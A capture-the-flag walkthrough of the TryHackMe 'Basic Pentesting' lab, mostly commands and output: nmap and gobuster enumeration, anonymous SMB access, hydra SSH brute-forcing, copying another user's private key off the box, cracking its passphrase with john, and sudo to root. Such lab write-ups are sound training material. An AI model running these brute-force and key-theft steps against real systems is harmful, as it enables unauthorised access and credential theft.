# Basic Pentesting [TryHackMe](https://tryhackme.com/room/basicpentestingjt)

---

![](./.assets/logo.jpg)

---

## Index

##### - [Enumeration](#enumeration)
##### - [Finding Vunerabilities](#finding-vunerabilities)
##### - [Brute Force in](#brute-force-in)
##### - [Horizontal Escalation](#horizontal-escalation)
##### - [Final Lookaround](#final-lookaround)

---

```shell
export IP=10.10.211.161
```

---

### Enumeration

```shell
nmap -sC -sV -v -A $IP -oN nmap/initial.log
```

Explaining the `nmap` flags:

`-sC` runs basic scripts against the target's ports as basic enumeration

`-sV` determines what software and version is running

`-v` verbose, information found is printed to terminal screen

`-A` agressive mode, not stealthy

`-oN` output in common format to a file

The results of the scan:

```
# Nmap 7.91 scan initiated Fri Aug  6 17:04:18 2021 as: nmap -vvv -p 22,80,139,445,8009,8080 -sC -sV -A -v -oN nmap/initial.log 10.10.211.161
Nmap scan report for 10.10.211.161
Host is up, received syn-ack (0.15s latency).
Scanned at 2021-08-06 17:04:18 +04 for 64s

PORT     STATE SERVICE     REASON  VERSION
22/tcp   open  ssh         syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDZXasCfWSXQ9lYiKbTNkPs0T+wFym2lZy229LllhY6iDLrjm7LIkhCcrlgnJQtLxl5NPhlHNVmwhlkcPPiAHwluhMVE5xKihQj3i+Ucx2IwiFvfmCz4AKsWlR6N8IZe55Ltw0lcH9ykuKZddg81X85EVsNbMacJNjjyxAtwQmJt1F5kB1B2ixgjLLOyNWafC5g1h6XbEgB2wiSRJ5UA8rOZaF28YcDVo0MQhsKpQG/5oPmQUsIeJTUA/XkoWCjvXZqHwv8XInQLQu3VXKgv735G+CJaKzplh7FZyXju8ViDSAY8gdhqpJommYxzqu9s1M31cmFg2fT5V1z9s4DP/vd
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBP0SXJpgwPf/e9AT9ri/dlAnkob4PqzMjl2Q9lZIVIXeEFJ9sfRkC+tgSjk9PwK0DUO3JU27pmtAkDL4Mtv9eZw=
|   256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAzy8ZacWXbPGeqtuiJCnPP0LYZYZlMj5D1ZY9ldg1wU
80/tcp   open  http        syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13?      syn-ack
| ajp-methods:
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http-proxy  syn-ack
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP:
|     HTTP/1.1 400
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 2243
|     Date: Fri, 06 Aug 2021 13:05:10 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400
|_    Request</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><bod
|_http-favicon: Apache Tomcat
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Apache Tomcat/9.0.7
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.91%I=7%D=8/6%Time=610D3385%P=x86_64-apple-darwin18.7.0
SF:%r(DNSVersionBindReqTCP,95F,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20t
SF:ext/html;charset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x2
SF:02243\r\nDate:\x20Fri,\x2006\x20Aug\x202021\x2013:05:10\x20GMT\r\nConne
SF:ction:\x20close\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><ti
SF:tle>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><sty
SF:le\x20type=\"text/css\">h1\x20{font-family:Tahoma,Arial,sans-serif;colo
SF:r:white;background-color:#525D76;font-size:22px;}\x20h2\x20{font-family
SF::Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size
SF::16px;}\x20h3\x20{font-family:Tahoma,Arial,sans-serif;color:white;backg
SF:round-color:#525D76;font-size:14px;}\x20body\x20{font-family:Tahoma,Ari
SF:al,sans-serif;color:black;background-color:white;}\x20b\x20{font-family
SF::Tahoma,Arial,sans-serif;color:white;background-color:#525D76;}\x20p\x2
SF:0{font-family:Tahoma,Arial,sans-serif;background:white;color:black;font
SF:-size:12px;}\x20a\x20{color:black;}\x20a\.name\x20{color:black;}\x20\.l
SF:ine\x20{height:1px;background-color:#525D76;border:none;}</style></head
SF:><bod")%r(DNSStatusRequestTCP,95F,"HTTP/1\.1\x20400\x20\r\nContent-Type
SF::\x20text/html;charset=utf-8\r\nContent-Language:\x20en\r\nContent-Leng
SF:th:\x202243\r\nDate:\x20Fri,\x2006\x20Aug\x202021\x2013:05:10\x20GMT\r\
SF:nConnection:\x20close\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><he
SF:ad><title>HTTP\x20Status\x20400\x20\xe2\x80\x93\x20Bad\x20Request</titl
SF:e><style\x20type=\"text/css\">h1\x20{font-family:Tahoma,Arial,sans-seri
SF:f;color:white;background-color:#525D76;font-size:22px;}\x20h2\x20{font-
SF:family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;fon
SF:t-size:16px;}\x20h3\x20{font-family:Tahoma,Arial,sans-serif;color:white
SF:;background-color:#525D76;font-size:14px;}\x20body\x20{font-family:Taho
SF:ma,Arial,sans-serif;color:black;background-color:white;}\x20b\x20{font-
SF:family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;}\x
SF:20p\x20{font-family:Tahoma,Arial,sans-serif;background:white;color:blac
SF:k;font-size:12px;}\x20a\x20{color:black;}\x20a\.name\x20{color:black;}\
SF:x20\.line\x20{height:1px;background-color:#525D76;border:none;}</style>
SF:</head><bod");
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m33s, median: 0s
| nbstat: NetBIOS name: BASIC2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   BASIC2<00>           Flags: <unique><active>
|   BASIC2<03>           Flags: <unique><active>
|   BASIC2<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 28167/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 53761/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 21202/udp): CLEAN (Failed to receive data)
|   Check 4 (port 6829/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: basic2
|   NetBIOS computer name: BASIC2\x00
|   Domain name: \x00
|   FQDN: basic2
|_  System time: 2021-08-06T09:05:17-04:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-08-06T13:05:17
|_  start_date: N/A

Read data files from: /usr/local/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Aug  6 17:05:22 2021 -- 1 IP address (1 host up) scanned in 64.34 seconds
```

We notice we have a port open for `http` on 80. We can use `gobuster` to enumerate that:
```shell
gobuster dir -t 64 -u $IP -w ~/wordlists/website_dir/directory-list-2.3-medium.txt -x .php,.txt -o gobuster/medium.log
```

`-t` how many tasks running concurrently
`-u` url/target
`-w` path to wordlist
`-x` extentions to include (eg. robots.txt)
`-o` output file

We quickly find `/development` which contains two text files `j.txt` and `dev.txt`

---

### Finding Vunerabilities

`j.txt` reveals that `J` has weak credentials - something we can most likely exploit, however, we do not have a username we can use yet.

`dev.txt` confirms our `nmap` scan finding an `smb` server open. We can access that using:

```
smbclient.py $IP
Impacket v0.9.24.dev1+20210625.150349.2eff99fc - Copyright 2021 SecureAuth Corporation

Type help for list of commands
# shares
Anonymous
IPC$
# use Anonymous
# ls
drw-rw-rw-          0  Thu Apr 19 21:31:20 2018 .
drw-rw-rw-          0  Thu Apr 19 21:13:06 2018 ..
-rw-rw-rw-        173  Thu Apr 19 21:29:55 2018 staff.txt
# get staff.txt
# exit
```

Checking the contents of staff.txt, we notice that we have a username for both parties - time to fire up `hydra` and brute-force our way in.

---

### Brute force in

We can use `hydra` to brute-force logins.

```shell
hydra -t 64 -l [REDACTED] -P ~/wordlists/rockyou.txt ssh://$IP
```

`-t` as before, how many tasks running concurrently

`-l` fixed username, not a wordlist (`-L` for a wordlist)

`-P` password list, not static password (`-p` for static password)

`rockyou.txt` the standard password dictionary that comes with kali

`ssh://$IP` the target

Waiting a few seconds [REDACTED] user's password is found! We can now `ssh` into the system.

---

### Horizontal Escalation

We're now in the box but are limited by our permissions on it and we don't have anything that really catches our eye in our home directory.
We can `cd` into the other user's home directory and spot a `pass.bak` that is not readable to us (yet).
However in listing the files, I quickly notice that [REDACTED]'s `.ssh` is readable by everyone. Navigating into that directory reveals that his `id_rsa` is readable by everyone and so is his `authorized_keys`

```
drwxr-xr-x 2 [REDACTED]  [REDACTED] 4096 Apr 23  2018 .ssh

---

-rw-rw-r-- 1 [REDACTED] [REDACTED]  771 Apr 23  2018 authorized_keys
-rw-r--r-- 1 [REDACTED] [REDACTED] 3326 Apr 19  2018 id_rsa
-rw-r--r-- 1 [REDACTED] [REDACTED]  771 Apr 19  2018 id_rsa.pub
```

All we have to do is `scp` or `wget` that file to ourselves (I do not recommend `cat`ing it and copying)
To `scp` the file we do the following:

```shell
scp [REDACTED]@$IP:/home/[REDACTED]/.ssh/id_rsa .
```

Or to use `python`

On the victim

```shell
cd /home/[REDACTED]/.ssh && python3 -m http.server 9999
```

And then on our machine

```shell
wget http://$IP:9999/id_rsa
```

And to complete either step:

```shell
chmod 600 id_rsa
```

We can now `ssh` into the other user...or can we?

```shell
# Use -i for an ssh key file
ssh -i id_rsa [REDACTED]@$IP
# Enter passphrase for key 'id_rsa':
```

Not quite done yet, are we?

We can use `ssh2john` and `john` to crack `ssh` key files

```shell
ssh2john.py id_rsa > id_rsa.hash && john --wordlist=~/wordlists/rockyou.txt id_rsa.hash
```

```
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
Use the "--format=ssh-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
[REDACTED]          (ssh_files/id_rsa)
1g 0:00:00:14 DONE 0.06738g/s 966419p/s 966419c/s 966419C/s
Session completed
```

We now have the password for the key file and can `ssh` into the machine and grab `pass.bak`
And the room is now complete... Mostly

---

### Final Lookaround

We have the other user's password from `pass.bak` and everything is submitted on the room, however, in easy rooms, all the ports have some sort of functionality.
I do the usual, and `sudo -l` to check this user's permissiong

```
[sudo] password for [REDACTED]:
Matching Defaults entries for [REDACTED] on basic2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User [REDACTED] may run the following commands on basic2:
    (ALL : ALL) ALL
```

Since we have unrestricted `sudo` access, we can `sudo su` and `cd /root` to check those contents.

```
Congratulations! You've completed this challenge. There are two ways (that I'm aware of) to gain
a shell, and two ways to privesc. I encourage you to find them all!

If you're in the target audience (newcomers to pentesting), I hope you learned something. A few
takeaways from this challenge should be that every little bit of information you can find can be
valuable, but sometimes you'll need to find several different pieces of information and combine
them to make them useful. Enumeration is key! Also, sometimes it's not as easy as just finding
an obviously outdated, vulnerable service right away with a port scan (unlike the first entry
in this series). Usually you'll have to dig deeper to find things that aren't as obvious, and
therefore might've been overlooked by administrators.

Thanks for taking the time to solve this VM. If you choose to create a writeup, I hope you'll send
me a link! I can be reached at josiah@vt.edu. If you've got questions or feedback, please reach
out to me

Happy hacking!
```

So there are other ways to root the box! Maybe for another day though, although I already have a few ideas ...

```
sudo -V
Tomcat or is it ghostcat ;)
```

![](./.assets/complete.png)
